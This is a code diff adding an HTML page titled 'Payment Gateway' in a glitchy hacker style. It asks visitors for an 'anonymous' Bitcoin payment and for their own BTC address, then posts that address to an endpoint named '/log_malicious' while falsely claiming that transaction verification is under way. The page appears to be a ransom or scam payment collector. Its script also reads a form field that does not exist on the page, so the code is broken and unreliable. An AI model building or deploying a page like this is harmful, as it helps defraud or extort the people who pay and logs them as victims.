@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: "Courier New", monospace;
+            text-align: center;
+            padding: 20px;
+        }
+
+        input, button {
+            background-color: black;
+            color: lime;
+            border: 1px solid lime;
+            padding: 10px;
+            font-size: 16px;
+            margin: 5px;
+        }
+
+        button:hover {
+            background-color: lime;
+            color: black;
+        }
+
+        @keyframes glitch {
+            0% { text-shadow: 2px 2px red; }
+            25% { text-shadow: -2px -2px blue; }
+            50% { text-shadow: 2px -2px green; }
+            75% { text-shadow: -2px 2px yellow; }
+            100% { text-shadow: 2px 2px red; }
+        }
+
+        h1 {
+            animation: glitch 0.2s infinite;
+        }
+    </style>
+    <script>
+        async function submitPayment() {
+            const myBTC = document.getElementById("myBTC").value.trim();
+            const userBTC = document.getElementById("userBTC").value.trim();
+            
+            if (!myBTC || !userBTC) {
+                alert("Both BTC addresses are required!");
+                return;
+            }
+
+            const data = { my_btc: myBTC, user_btc: userBTC, timestamp: new Date().toISOString() };
+            
+            try {
+                const response = await fetch('/log_malicious', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                
+                if (response.ok) {
+                    alert("Payment details submitted. Transaction verification in progress.");
+                } else {
+                    alert("Error submitting payment details.");
+                }
+            } catch (error) {
+                console.error("Error sending data:", error);
+                alert("An error occurred.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Make Your Anonymous Payment</h1>
+    <p>Make your BTC payment here:</p>
+    <p>Address Here 054876</p>
+    <p>Enter your BTC address for verification:</p>
+    <input type="text" id="userBTC" placeholder="Your BTC Address">
+    <br>
+    <button onclick="submitPayment()">Submit Payment</button>
+</body>
+</html>
